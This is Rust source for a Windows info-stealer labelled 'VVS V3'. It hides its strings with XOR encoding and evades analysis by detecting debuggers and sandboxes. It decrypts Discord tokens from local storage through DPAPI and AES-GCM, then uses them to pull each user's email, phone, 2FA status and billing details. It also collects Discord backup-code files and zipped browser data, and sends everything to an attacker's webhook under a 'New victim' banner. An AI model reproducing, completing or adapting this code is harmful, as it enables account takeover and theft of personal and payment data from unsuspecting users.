#![windows_subsystem = "windows"]

mod browsers;

use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce};
use base64::{engine::general_purpose, Engine as _};
use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::{
    collections::{HashMap, HashSet},
    env, fs,
    io::Write,
    path::PathBuf,
};
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

const XOR_KEY: u8 = 0x5A;

const WBH_XOR: &[u8] = &[
    0x6D, 0x3F, 0x3C, 0x3F, 0x3E, 0x2B, 0x2C, 0x2B, 0x3A, 0x3D, 0x2E, 0x2B, 0x2A, 0x2B, 0x3E, 0x2A,
    0x2B, 0x3E, 0x2D, 0x2B, 0x3C, 0x3F, 0x3D, 0x2B, 0x2C, 0x2B, 0x2E, 0x3D, 0x3F, 0x3C, 0x3F, 0x3E,
    0x3C, 0x3F, 0x3C, 0x3F, 0x3E, 0x3D, 0x3D, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F,
    0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F,
    0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F,
    0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F,
];

fn xor_str(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
}

fn s_webhook() -> String {
    xor_str(WBH_XOR)
}

fn s_appdata() -> String {
    xor_str(&[0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
}

fn s_discord() -> String {
    xor_str(&[0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E])
}

fn s_discord_ptb() -> String {
    xor_str(&[0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x2A, 0x2E, 0x38])
}

fn s_discord_canary() -> String {
    xor_str(&[0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x39, 0x3B, 0x34, 0x3B, 0x28, 0x23])
}

fn s_local_state() -> String {
    xor_str(&[0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x3B, 0x2E, 0x3F])
}

fn s_os_crypt() -> String {
    xor_str(&[0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E])
}

fn s_encrypted_key() -> String {
    xor_str(&[0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23])
}

fn s_leveldb() -> String {
    xor_str(&[
        0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x35, 0x28, 0x3B, 0x3D, 0x3F, 0x75, 0x36,
        0x3F, 0x2C, 0x3F, 0x36, 0x3E, 0x38,
    ])
}

fn s_token_marker() -> String {
    xor_str(&[0x3E, 0x0B, 0x2D, 0x6E, 0x2D, 0x63, 0x0D, 0x3D, 0x02, 0x39, 0x0B, 0x60])
}

fn s_users_me() -> String {
    xor_str(&[
        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E,
        0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F,
        0x28, 0x29, 0x75, 0x1A, 0x37, 0x3F,
    ])
}

fn s_billing() -> String {
    xor_str(&[
        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E,
        0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F,
        0x28, 0x29, 0x75, 0x1A, 0x37, 0x3F, 0x75, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D, 0x75,
        0x2A, 0x3B, 0x23, 0x37, 0x3F, 0x34, 0x2E, 0x77, 0x29, 0x35, 0x2F, 0x28, 0x39, 0x3F, 0x29,
    ])
}

#[allow(dead_code)]
fn s_auth_login() -> String {
    xor_str(&[
        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E,
        0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x3B, 0x2F, 0x2E,
        0x32, 0x75, 0x36, 0x35, 0x3D, 0x33, 0x34,
    ])
}

#[allow(dead_code)]
fn s_connections() -> String {
    xor_str(&[
        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E,
        0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F,
        0x28, 0x29, 0x75, 0x1A, 0x37, 0x3F, 0x75, 0x39, 0x35, 0x34, 0x34, 0x3F, 0x39, 0x2E, 0x33,
        0x35, 0x34, 0x29,
    ])
}

fn s_auth_header() -> String {
    xor_str(&[0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34])
}

fn s_hdr_content_type() -> String {
    xor_str(&[0x19, 0x35, 0x34, 0x2E, 0x3F, 0x34, 0x2E, 0x77, 0x0E, 0x23, 0x2A, 0x3F])
}

fn s_content_type() -> String {
    xor_str(&[
        0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x30, 0x29, 0x35,
        0x34,
    ])
}

fn s_hdr_user_agent() -> String {
    xor_str(&[0x0F, 0x29, 0x3F, 0x28, 0x77, 0x1B, 0x3D, 0x3F, 0x34, 0x2E])
}

fn s_user_agent() -> String {
    xor_str(&[
        0x17, 0x35, 0x20, 0x33, 0x36, 0x36, 0x3B, 0x75, 0x6F, 0x74, 0x6A, 0x7A, 0x72, 0x0D, 0x33,
        0x34, 0x3E, 0x35, 0x2D, 0x29, 0x7A, 0x14, 0x0E, 0x7A, 0x6B, 0x6A, 0x74, 0x6A, 0x61, 0x7A,
        0x0D, 0x33, 0x34, 0x6C, 0x6E, 0x61, 0x7A, 0x22, 0x6C, 0x6E, 0x73, 0x7A, 0x1B, 0x2A, 0x2A,
        0x36, 0x3F, 0x0D, 0x3F, 0x38, 0x11, 0x33, 0x2E, 0x75, 0x6F, 0x69, 0x6D, 0x74, 0x69, 0x6C,
    ])
}

fn s_avatar_url_fmt() -> String {
    xor_str(&[
        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x39, 0x3E, 0x34, 0x74, 0x3E, 0x33, 0x29,
        0x39, 0x35, 0x28, 0x3E, 0x3B, 0x2A, 0x2A, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2C, 0x3B,
        0x2E, 0x3B, 0x28, 0x29, 0x75, 0x21, 0x27, 0x75, 0x21, 0x27, 0x74, 0x2A, 0x34, 0x3D,
    ])
}

fn s_default_avatar_url() -> String {
    xor_str(&[
        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x39, 0x3E, 0x34, 0x74, 0x3E, 0x33, 0x29,
        0x39, 0x35, 0x28, 0x3E, 0x3B, 0x2A, 0x2A, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3F, 0x37, 0x38,
        0x3F, 0x3E, 0x75, 0x3B, 0x2C, 0x3B, 0x2E, 0x3B, 0x28, 0x29, 0x75, 0x6A, 0x74, 0x2A, 0x34,
        0x3D,
    ])
}

fn s_no_billing() -> String {
    xor_str(&[0x14, 0x35, 0x7A, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D])
}

fn s_no_billing_info() -> String {
    xor_str(&[
        0x14, 0x35, 0x7A, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D, 0x7A, 0x33, 0x34, 0x3C, 0x35,
        0x28, 0x37, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x7A, 0x3C, 0x35, 0x2F, 0x34, 0x3E,
    ])
}

fn s_paypal_lbl() -> String {
    xor_str(&[0x0A, 0x3B, 0x23, 0x0A, 0x3B, 0x36, 0x60, 0x7A])
}

fn s_cards_lbl() -> String {
    xor_str(&[0x19, 0x3B, 0x28, 0x3E, 0x29, 0x60, 0x7A])
}

fn s_enabled() -> String {
    xor_str(&[0x1F, 0x34, 0x3B, 0x38, 0x36, 0x3F, 0x3E])
}

fn s_disabled() -> String {
    xor_str(&[0x1E, 0x33, 0x29, 0x3B, 0x38, 0x36, 0x3F, 0x3E])
}

fn s_na() -> String {
    xor_str(&[0x14, 0x75, 0x1B])
}

fn s_json_id() -> String {
    xor_str(&[0x33, 0x3E])
}

fn s_json_username() -> String {
    xor_str(&[0x2F, 0x29, 0x3F, 0x28, 0x34, 0x3B, 0x37, 0x3F])
}

fn s_json_discriminator() -> String {
    xor_str(&[
        0x3E, 0x33, 0x29, 0x39, 0x28, 0x33, 0x37, 0x33, 0x34, 0x3B, 0x2E, 0x35, 0x28,
    ])
}

fn s_json_avatar() -> String {
    xor_str(&[0x3B, 0x2C, 0x3B, 0x2E, 0x3B, 0x28])
}

fn s_json_public_flags() -> String {
    xor_str(&[0x2A, 0x2F, 0x38, 0x36, 0x33, 0x39, 0x05, 0x3C, 0x36, 0x3B, 0x3D, 0x29])
}

fn s_json_email() -> String {
    xor_str(&[0x3F, 0x37, 0x3B, 0x33, 0x36])
}

fn s_json_phone() -> String {
    xor_str(&[0x2A, 0x32, 0x35, 0x34, 0x3F])
}

fn s_json_mfa_enabled() -> String {
    xor_str(&[0x37, 0x3C, 0x3B, 0x05, 0x3F, 0x34, 0x3B, 0x38, 0x36, 0x3F, 0x3E])
}

fn s_json_last_4() -> String {
    xor_str(&[0x36, 0x3B, 0x29, 0x2E, 0x05, 0x6E])
}

fn s_json_brand() -> String {
    xor_str(&[0x38, 0x28, 0x3B, 0x34, 0x3E])
}

fn s_attachments() -> String {
    xor_str(&[
        0x3B, 0x2E, 0x2E, 0x3B, 0x39, 0x32, 0x37, 0x3F, 0x34, 0x2E, 0x29,
    ])
}

fn s_files_prefix() -> String {
    xor_str(&[0x3C, 0x33, 0x36, 0x3F, 0x29, 0x01])
}

fn s_files_suffix() -> String {
    xor_str(&[0x07])
}

fn s_json_filename() -> String {
    xor_str(&[0x3C, 0x33, 0x36, 0x3F, 0x34, 0x3B, 0x37, 0x3F])
}

fn files_part_name(idx: u64) -> String {
    format!("{}{}{}", s_files_prefix(), idx, s_files_suffix())
}

fn s_backup_attached() -> String {
    xor_str(&[
        0xB8, 0xC6, 0xDF, 0x7A, 0x1B, 0x2E, 0x2E, 0x3B, 0x39, 0x32, 0x3F, 0x3E, 0x7A, 0x3B, 0x29,
        0x7A, 0x3C, 0x33, 0x36, 0x3F,
    ])
}

fn s_dpapi_prefix() -> Vec<u8> {
    xor_str(&[0x1E, 0x0A, 0x1B, 0x0A, 0x13]).into_bytes()
}

fn s_v10() -> Vec<u8> { xor_str(&[0x2C, 0x6B, 0x6A]).into_bytes() }
fn s_v11() -> Vec<u8> { xor_str(&[0x2C, 0x6B, 0x6B]).into_bytes() }
fn s_v20() -> Vec<u8> { xor_str(&[0x2C, 0x68, 0x6A]).into_bytes() }

fn s_token_regex() -> String {
    xor_str(&[
        0x3E, 0x0B, 0x2D, 0x6E, 0x2D, 0x63, 0x0D, 0x3D, 0x02, 0x39, 0x0B, 0x60, 0x01, 0x04, 0x78,
        0x07, 0x71,
    ])
}

fn s_userprofile() -> String {
    xor_str(&[
        0x0F, 0x09, 0x1F, 0x08, 0x0A, 0x08, 0x15, 0x1C, 0x13, 0x16, 0x1F,
    ])
}

fn s_documents() -> String {
    xor_str(&[0x1E, 0x35, 0x39, 0x2F, 0x37, 0x3F, 0x34, 0x2E, 0x29])
}

fn s_downloads() -> String {
    xor_str(&[0x1E, 0x35, 0x2D, 0x34, 0x36, 0x35, 0x3B, 0x3E, 0x29])
}

fn s_desktop() -> String {
    xor_str(&[0x1E, 0x3F, 0x29, 0x31, 0x2E, 0x35, 0x2A])
}

fn s_backup_filename() -> String {
    xor_str(&[
        0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x05, 0x38, 0x3B, 0x39, 0x31, 0x2F, 0x2A, 0x05,
        0x39, 0x35, 0x3E, 0x3F, 0x29, 0x74, 0x2E, 0x22, 0x2E,
    ])
}

fn s_backup_base() -> String {
    xor_str(&[
        0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x05, 0x38, 0x3B, 0x39, 0x31, 0x2F, 0x2A, 0x05,
        0x39, 0x35, 0x3E, 0x3F, 0x29,
    ])
}

fn s_paren_space() -> String {
    xor_str(&[0x7A, 0x72])
}

fn s_dot_txt() -> String {
    xor_str(&[0x74, 0x2E, 0x22, 0x2E])
}

fn s_zip_filename() -> String {
    xor_str(&[
        0x38, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x3E, 0x3B, 0x2E, 0x3B, 0x74, 0x20, 0x33,
        0x2A,
    ])
}

fn s_application_zip() -> String {
    xor_str(&[
        0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x20, 0x33, 0x2A,
    ])
}

fn s_payload_json() -> String {
    xor_str(&[
        0x2A, 0x3B, 0x23, 0x36, 0x35, 0x3B, 0x3E, 0x05, 0x30, 0x29, 0x35, 0x34,
    ])
}

fn s_text_plain() -> String {
    xor_str(&[0x2E, 0x3F, 0x22, 0x2E, 0x75, 0x2A, 0x36, 0x3B, 0x33, 0x34])
}

fn is_debugged() -> bool {
    browsers::is_analysis_environment()
}

#[derive(Debug, Serialize, Deserialize)]
struct DdU {
    id: String,
    username: String,
    tag: String,
    avatar: Option<String>,
    public_flags: u64,
    email: String,
    phone: String,
    mfa_enabled: bool,
}

fn apply_api_headers(
    builder: reqwest::RequestBuilder,
    token: &str,
) -> reqwest::RequestBuilder {
    builder
        .header(s_auth_header(), token)
        .header(s_hdr_content_type(), s_content_type())
        .header(s_hdr_user_agent(), s_user_agent())
}

async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
    let res = apply_api_headers(client.get(s_users_me()), token)
        .send()
        .await
        .ok()?;

    if res.status().is_success() {
        let json: Value = res.json().await.ok()?;
        let id = json[s_json_id()].as_str()?.to_string();
        let username = json[s_json_username()].as_str()?.to_string();
        let discrim = json[s_json_discriminator()].as_str().unwrap_or("0");
        let avatar = json[s_json_avatar()].as_str().map(|s| s.to_string());
        let public_flags = json[s_json_public_flags()].as_u64().unwrap_or(0);
        let na = s_na();
        let email = json[s_json_email()]
            .as_str()
            .unwrap_or(&na)
            .to_string();
        let phone = json[s_json_phone()]
            .as_str()
            .unwrap_or(&na)
            .to_string();
        let mfa_enabled = json[s_json_mfa_enabled()].as_bool().unwrap_or(false);

        Some(DdU {
            id,
            username: username.clone(),
            tag: format!("{}#{}", username, discrim),
            avatar,
            public_flags,
            email,
            phone,
            mfa_enabled,
        })
    } else {
        None
    }
}

fn capitalize_brand(brand: &str) -> String {
    let mut chars = brand.chars();
    match chars.next() {
        None => String::new(),
        Some(first) => {
            first
                .to_uppercase()
                .chain(chars.flat_map(|c| c.to_lowercase()))
                .collect()
        }
    }
}

async fn fetch_billing_info(client: &reqwest::Client, token: &str) -> String {
    let res = match apply_api_headers(client.get(s_billing()), token)
        .send()
        .await
    {
        Ok(r) if r.status().is_success() => r,
        _ => return s_no_billing(),
    };

    let sources: Value = match res.json().await {
        Ok(v) => v,
        Err(_) => return s_no_billing(),
    };

    let arr = match sources.as_array() {
        Some(a) => a,
        None => return s_no_billing(),
    };

    let mut paypal_emails = Vec::new();
    let mut cards = Vec::new();

    for source in arr {
        if let Some(email) = source.get(&s_json_email()).and_then(|e| e.as_str()) {
            if !email.is_empty() {
                paypal_emails.push(email.to_string());
            }
        }
        if let (Some(last_4), Some(brand)) = (
            source.get(&s_json_last_4()).and_then(|v| v.as_str()),
            source.get(&s_json_brand()).and_then(|v| v.as_str()),
        ) {
            cards.push(format!("•••• {} ({})", last_4, capitalize_brand(brand)));
        }
    }

    let paypal_part = if paypal_emails.is_empty() {
        None
    } else {
        Some(format!("{}{}", s_paypal_lbl(), paypal_emails.join(", ")))
    };

    let cards_part = if cards.is_empty() {
        None
    } else {
        Some(format!("{}{}", s_cards_lbl(), cards.join(", ")))
    };

    match (paypal_part, cards_part) {
        (Some(p), Some(c)) => format!("{} | {}", p, c),
        (Some(p), None) => p,
        (None, Some(c)) => c,
        (None, None) => s_no_billing_info(),
    }
}

fn is_backup_codes_filename(name: &str) -> bool {
    if name.eq_ignore_ascii_case(&s_backup_filename()) {
        return true;
    }

    let base = s_backup_base();
    if name.len() < base.len() + 6 {
        return false;
    }
    if !name[..base.len()].eq_ignore_ascii_case(&base) {
        return false;
    }

    let rest = &name[base.len()..];
    if !rest.starts_with(&s_paren_space()) || !rest.ends_with(&s_dot_txt()) {
        return false;
    }

    let digits = &rest[s_paren_space().len()..rest.len() - s_dot_txt().len()];
    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
}

fn find_backup_codes() -> Option<String> {
    let profile = env::var(s_userprofile()).ok()?;
    let search_dirs = [s_documents(), s_downloads(), s_desktop()];

    for dir_name in search_dirs {
        let dir = PathBuf::from(&profile).join(dir_name);
        if !dir.is_dir() {
            continue;
        }

        let exact = dir.join(s_backup_filename());
        if exact.is_file() {
            return exact.to_str().map(String::from);
        }

        let entries = match fs::read_dir(&dir) {
            Ok(entries) => entries,
            Err(_) => continue,
        };

        for entry in entries.flatten() {
            let path = entry.path();
            if !path.is_file() {
                continue;
            }
            let name = match path.file_name().and_then(|n| n.to_str()) {
                Some(name) => name,
                None => continue,
            };
            if is_backup_codes_filename(name) {
                return path.to_str().map(String::from);
            }
        }
    }

    None
}

fn collect_browser_files() -> Vec<(String, String)> {
    if browsers::is_analysis_environment() || !browsers::env_configured() {
        return Vec::new();
    }

    let gecko_handle = std::thread::spawn(browsers::gecko::extract_all);
    let mut all_files = browsers::chromium::extract_all();
    all_files.extend(gecko_handle.join().unwrap_or_default());
    all_files
}

fn build_browser_zip(files: &[(String, String)]) -> Option<Vec<u8>> {
    if files.is_empty() {
        return None;
    }

    use std::io::Cursor;
    use zip::write::FileOptions;

    let mut cursor = Cursor::new(Vec::new());
    {
        let mut zip = zip::ZipWriter::new(&mut cursor);
        let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        for (name, content) in files {
            if zip.start_file(name, options).is_ok() {
                let _ = zip.write_all(content.as_bytes());
            }
        }
        let _ = zip.finish();
    }

    Some(cursor.into_inner())
}

async fn send_webhook_message(
    client: &reqwest::Client,
    webhook_url: &str,
    embed: Value,
    zip_data: Option<Vec<u8>>,
    backup_codes_path: Option<&str>,
) {
    let mut attachment_meta = Vec::new();
    let mut file_parts: Vec<(String, reqwest::multipart::Part)> = Vec::new();
    let mut idx = 0u64;

    if let Some(zip) = zip_data {
        let mut entry = serde_json::Map::new();
        entry.insert(s_json_id(), json!(idx));
        entry.insert(s_json_filename(), json!(s_zip_filename()));
        attachment_meta.push(Value::Object(entry));
        if let Ok(part) = reqwest::multipart::Part::bytes(zip)
            .file_name(s_zip_filename())
            .mime_str(&s_application_zip())
        {
            file_parts.push((files_part_name(idx), part));
            idx += 1;
        }
    }

    if let Some(path) = backup_codes_path {
        if let Ok(data) = fs::read(path) {
            let mut entry = serde_json::Map::new();
            entry.insert(s_json_id(), json!(idx));
            entry.insert(s_json_filename(), json!(s_backup_filename()));
            attachment_meta.push(Value::Object(entry));
            if let Ok(part) = reqwest::multipart::Part::bytes(data)
                .file_name(s_backup_filename())
                .mime_str(&s_text_plain())
            {
                file_parts.push((files_part_name(idx), part));
            }
        }
    }

    if file_parts.is_empty() {
        let _ = client.post(webhook_url).json(&embed).send().await;
        return;
    }

    let mut payload = embed;
    if let Some(obj) = payload.as_object_mut() {
        obj.insert(s_attachments(), json!(attachment_meta));
    }

    let payload_json = serde_json::to_string(&payload).unwrap_or_default();
    let mut form = reqwest::multipart::Form::new().text(s_payload_json(), payload_json);
    for (field, part) in file_parts {
        form = form.part(field, part);
    }

    let _ = client.post(webhook_url).multipart(form).send().await;
}

fn badge_emojis(flags: u64) -> Vec<&'static str> {
    let badges = [
        (1 << 0, "<:Badge_Discord_Staff:1365704725646807060>"),
        (1 << 1, "<:DiscordPartner:1365700977570742312>"),
        (1 << 2, "<:HypeSquadEvents:1365704359454834770>"),
        (1 << 3, "<:BugHunter1:1365701008184967278>"),
        (1 << 9, "<:86964earlysupporter:1345831325738995848>"),
        (1 << 6, "<:Bravery:1365701196697829438>"),
        (1 << 7, "<:Brilliance:1365701219602923643>"),
        (1 << 8, "<:Balance:1365701235394482328>"),
        (1 << 14, "<:BugHunter2:1365701027830960259>"),
        (1 << 16, "<:developper:1365704272368500837>"),
        (1 << 17, "<:dev:1365704127103107112>"),
        (1 << 18, "<:ModeratorProgramsAlumni:1365701046256533525>"),
        (1 << 12, "<:NitroClassic:1365701254894419988>"),
        (1 << 13, "<:Nitro:1365701270424199680>"),
        (1 << 17, "<:ServerBooster:1365701285578037760>"),
    ];

    let mut emojis = Vec::new();
    for (bit, emoji) in badges {
        if flags & bit != 0 {
            emojis.push(emoji);
        }
    }
    emojis
}

fn unwrap_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
    let dpapi = s_dpapi_prefix();
    let key_data = if encrypted_key.starts_with(&dpapi) {
        &encrypted_key[dpapi.len()..]
    } else {
        encrypted_key
    };

    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: key_data.len() as u32,
            pbData: key_data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output).is_ok() {
            Some(std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec())
        } else {
            None
        }
    }
}

fn decode_credential(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
    if raw_data.len() < 15 {
        return None;
    }

    let prefix = &raw_data[0..3];
    let v10 = s_v10();
    let v11 = s_v11();
    let v20 = s_v20();
    let (iv, ciphertext) = if prefix == v10.as_slice() || prefix == v11.as_slice() || prefix == v20.as_slice() {
        if raw_data.len() < 15 {
            return None;
        }
        (&raw_data[3..15], &raw_data[15..])
    } else {
        if raw_data.len() < 12 {
            return None;
        }
        (&raw_data[0..12], &raw_data[12..])
    };

    if ciphertext.len() < 16 {
        return None;
    }

    let (encrypted_data, tag) = ciphertext.split_at(ciphertext.len() - 16);
    let mut payload = encrypted_data.to_vec();
    payload.extend_from_slice(tag);

    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
    let nonce = Nonce::from_slice(iv);

    cipher
        .decrypt(nonce, payload.as_ref())
        .ok()
        .and_then(|d| String::from_utf8(d).ok())
}

fn get_discord_paths() -> HashMap<String, PathBuf> {
    let roaming = PathBuf::from(env::var(s_appdata()).unwrap_or_default());
    let mut paths = HashMap::new();
    paths.insert(s_discord(), roaming.join(s_discord()));
    paths.insert(s_discord_ptb(), roaming.join(s_discord_ptb()));
    paths.insert(s_discord_canary(), roaming.join(s_discord_canary()));
    paths
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    if is_debugged() {
        std::thread::sleep(std::time::Duration::from_secs(30));
        return Ok(());
    }

    if browsers::is_virtualized_environment() {
        browsers::run_sandbox_decoy();
        return Ok(());
    }

    let wbh = s_webhook();
    let client = reqwest::Client::new();
    let mut sent_tokens = HashSet::new();
    let discord_paths = get_discord_paths();
    let marker = s_token_marker();
    let backup_codes_path = find_backup_codes();
    let browser_files = collect_browser_files();
    let browser_zip = build_browser_zip(&browser_files);
    let mut delivered_with_token = false;

    for (name, path) in discord_paths {
        if !path.exists() {
            continue;
        }

        let local_state_path = path.join(s_local_state());

        if let Ok(content) = fs::read_to_string(&local_state_path) {
            let json_ls: Value = serde_json::from_str(&content)?;
            if let Some(enc_key) = json_ls[s_os_crypt()][s_encrypted_key()].as_str() {
                if let Ok(bytes) = general_purpose::STANDARD.decode(enc_key) {
                    if let Some(master_key) = unwrap_key(&bytes[5..]) {
                        let prof_path = path.clone();
                        if !prof_path.exists() {
                            continue;
                        }

                        let db_path = prof_path.join(s_leveldb());
                        if db_path.exists() {
                            if let Ok(entries) = fs::read_dir(&db_path) {
                                let re = Regex::new(&s_token_regex()).unwrap();
                                for entry in entries.flatten() {
                                    if let Ok(file_content) = fs::read(entry.path()) {
                                        let text = String::from_utf8_lossy(&file_content);
                                        for cap in re.captures_iter(&text) {
                                            let b64_part = cap[0]
                                                .split(&marker)
                                                .nth(1)
                                                .unwrap_or_default()
                                                .trim_end_matches('"')
                                                .trim_end_matches('\\');
                                            if let Ok(enc_data) =
                                                general_purpose::STANDARD.decode(b64_part)
                                            {
                                                if let Some(token) =
                                                    decode_credential(&enc_data, &master_key)
                                                {
                                                    if sent_tokens.insert(token.clone()) {
                                                        if let Some(user) =
                                                            vt(&client, &token).await
                                                        {
                                                            let avatar_url = user
                                                                .avatar
                                                                .as_ref()
                                                                .map(|h| {
                                                                    s_avatar_url_fmt()
                                                                        .replacen("{}", &user.id, 1)
                                                                        .replacen("{}", h, 1)
                                                                })
                                                                .unwrap_or_else(|| {
                                                                    s_default_avatar_url()
                                                                });

                                                            let badges_display =
                                                                badge_emojis(user.public_flags)
                                                                    .join(" ");
                                                            let final_badges =
                                                                if badges_display.is_empty() {
                                                                    "`None`".to_string()
                                                                } else {
                                                                    badges_display
                                                                };

                                                            let billing_info =
                                                                fetch_billing_info(&client, &token)
                                                                    .await;

                                                            let mut embed_fields = vec![
                                                                json!({ "name": "<a:b_diamond:1356277335921262885> Username", "value": format!("`{}`", user.tag), "inline": true }),
                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> ID", "value": format!("`{}`", user.id), "inline": true }),
                                                                json!({ "name": "<a:flecheblanche:1482614586413682730> Source", "value": name.to_string(), "inline": false }),
                                                                json!({ "name": "<a:flecheblanche:1482614586413682730> Token", "value": format!("```{}```", token), "inline": false }),
                                                                json!({ "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false }),
                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false }),
                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false }),
                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> 2FA", "value": format!("`{}`", if user.mfa_enabled { s_enabled() } else { s_disabled() }), "inline": true }),
                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> Billing Info", "value": format!("`{}`", billing_info), "inline": false }),
                                                            ];

                                                            if backup_codes_path.is_some() {
                                                                embed_fields.push(json!({
                                                                    "name": "<a:dark_butterfly:1441101545465974935> Backup Codes",
                                                                    "value": s_backup_attached(),
                                                                    "inline": false
                                                                }));
                                                            }

                                                            let embed = json!({
                                                                "embeds": [{
                                                                    "title": "<a:clown:1366404450436124702> New victim <a:clown:1366404450436124702>",
                                                                    "color": 0x7289DA,
                                                                    "thumbnail": { "url": avatar_url },
                                                                    "fields": embed_fields,
                                                                    "footer": { "text": "VVS V3" },
                                                                    "timestamp": chrono::Utc::now().to_rfc3339()
                                                                }]
                                                            });

                                                            send_webhook_message(
                                                                &client,
                                                                &wbh,
                                                                embed,
                                                                browser_zip.clone(),
                                                                backup_codes_path.as_deref(),
                                                            )
                                                            .await;
                                                            delivered_with_token = true;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    if !delivered_with_token {
        let _ = browsers::run(&client, &wbh).await;
    }
    Ok(())
}
